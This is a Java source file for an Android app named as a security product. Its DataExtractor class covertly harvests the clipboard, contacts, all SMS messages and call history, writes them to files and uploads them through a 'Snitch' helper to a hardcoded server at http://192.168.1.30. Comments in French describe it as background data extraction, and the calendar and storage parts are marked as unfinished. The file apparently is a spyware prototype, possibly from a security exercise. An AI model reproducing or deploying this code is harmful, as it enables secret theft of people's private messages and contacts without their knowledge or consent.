package com.example.supersecurepluspremium;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.util.HashSet;

import static android.content.Context.CLIPBOARD_SERVICE;

//Classe effectuant les tâches en fond d'extraction applicative de données
//Prototype général des méthodes :
//void extractData(boolean sendToVPS)
//sendToVPS = true implique l'utilisation de snitch pour envoyer les données
public class DataExtractor {
    private Context context;
    private static final String URL = "http://192.168.1.30";

    public DataExtractor(Context appContext) {
        context = appContext;
    }

    // not working - tentative d'extraction de calendrier
    // a priori necessite root priv -> contentResolver null sinon
    public void extractCalendar(boolean sendToVPS){
        ContentResolver contentResolver = context.getContentResolver();
        ///data/data/com.android.providers.calendar/databases/
        //content://calendar/calendars
        Cursor cursor = contentResolver.query(Uri.parse("content://com.android.calendar/events"),
                (new String[] { "_id", "displayName", "selected" }), null, null, null);

        HashSet<String> calendarIds = new HashSet<String>();
        //while (cursor.moveToNext()) {
            //final String _id = cursor.getString(0);
            //final String displayName = cursor.getString(1);
            //final Boolean selected = !cursor.getString(2).equals("0");

            //Log.v("secme","Id: " + _id + " Display Name: " + displayName + " Selected: " + selected);
            //calendarIds.add(_id);
        //}
        // L'idee etait ensuite pour chaque calendrier, parcourir les event
        /*for (String id : calendarIds) {
            Uri.Builder builder = Uri.parse("content://calendar/instances/when").buildUpon();
            long now = new Date().getTime();
            ContentUris.appendId(builder, now - DateUtils.WEEK_IN_MILLIS);
            ContentUris.appendId(builder, now + DateUtils.WEEK_IN_MILLIS);

            Cursor eventCursor = contentResolver.query(builder.build(),
                    new String[] { "title", "begin", "end", "allDay"}, "Calendars._id=" + id,
                    null, "startDay ASC, startMinute ASC");
            while (eventCursor.moveToNext()) {
                final String title = eventCursor.getString(0);
                final Date begin = new Date(eventCursor.getLong(1));
                final Date end = new Date(eventCursor.getLong(2));
                final Boolean allDay = !eventCursor.getString(3).equals("0");
                Log.v("secme","Title: " + title + " Begin: " + begin + " End: " + end + " All Day: " + allDay);
            }
            }*/
    }

    //fonction qui permettait d'afficher les fichiers -> external storage only, pas poursuivi
    public void extractPictures(boolean sendToVPS) {
        //String path = Environment.getExternalStorageDirectory().toString()+"/Pictures";
        String path = Environment.getExternalStorageDirectory().toString();
        File directory = new File(path);
        File[] files = directory.listFiles();
        for (int i = 0; i < files.length; i++)
        {
            Log.v("secme", "FileName:" + files[i].getName());
            File[] files2 = files[i].listFiles();
            for (int j = 0; j < files2.length; j++)
                Log.v("secme", "\tFileName:" + files[j].getName());
        }
    }

    // can only get latest element from clipboard
    public void extractClipboard(boolean sendToVPS) {
        try {
            ClipboardManager clipboard = (ClipboardManager) context.getSystemService(CLIPBOARD_SERVICE);
            ClipData clip = clipboard.getPrimaryClip();
            writeToFile(clip.toString(), "clipboard.txt");
            if (sendToVPS)
                sendToVPS(clip.toString(), "clipboard.txt");
        } catch (Exception e) {
            Log.v("secme", "Empty clipboard");
        }
    }

    public void extractContacts(boolean sendToVPS) {
        ContentResolver cr = context.getContentResolver();
        String contacts = "\tCONTACT LIST\n";
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts += name + " : " + phoneNo + "\n";
                    }
                    pCur.close();
                }
            }
            //ecrit contact
            writeToFile(contacts, "contacts.txt");
            if (sendToVPS)
                sendToVPS(contacts, "contacts.txt");
        }
        if(cur!=null){
            cur.close();
        }
    }

    //Overwrites if file exists
    private void writeToFile(String data, String filename) {
        File path = context.getFilesDir();
        File file = new File(path, filename);
        Log.v("secme", "Data extractor writes " + data + " as " + filename + " in "+ file.getAbsolutePath());
        FileOutputStream stream;
        try {
            stream = new FileOutputStream(file);
            try {
                stream.write(data.getBytes());
            } finally {
                stream.close();
            }
        } catch (Exception e) {
            return;
        }
    }

    private void sendToVPS(String data, String filename) {
        File file = new File(context.getFilesDir(), filename);
        Snitch snitch = new Snitch(context, URL);

        Log.v("secme", filename+" ecrit dans "+ file.getAbsolutePath());

        if (file.exists()) {
            snitch.sendWebRequest(file, filename, "txt");
            return;
        }
        Log.v("secme", "Data extractor send " + data + " to VPS as " + filename);
    }

    public void extractSMS(boolean sendToVPS){
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
        String data = "\tSMS";
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                data += "\n";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    if (idx==0){
                        data += cursor.getColumnName(idx) + ":" + cursor.getString(idx)+"\n";
                    }else{
                        data += "\t" + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+"\n";
                    }

                }
                // use msgData

            } while (cursor.moveToNext());
        }
        writeToFile(data, "sms.txt");
        if (sendToVPS) {
            sendToVPS(data, "sms.txt");
        }

    }

    public void extractCallHistory(boolean sendToVPS) {
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        String data = "\tCALL_HISTORY";
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                data += "\n";
                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    if (idx == 0) {
                        data += cursor.getColumnName(idx) + ":" + cursor.getString(idx) + "\n";
                    } else {
                        data += "\t" + cursor.getColumnName(idx) + ":" + cursor.getString(idx) + "\n";
                    }

                }
                // use msgData

            } while (cursor.moveToNext());
        }
        writeToFile(data, "call_history.txt");
        if (sendToVPS) {
            sendToVPS(data, "call_history.txt");
        }
    }
}


/*
        //test background run
        for (int i=0;i<30;i++){
            Log.v("secme","\tdata extraction");
            try {
                Thread.sleep(1000);
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }*/
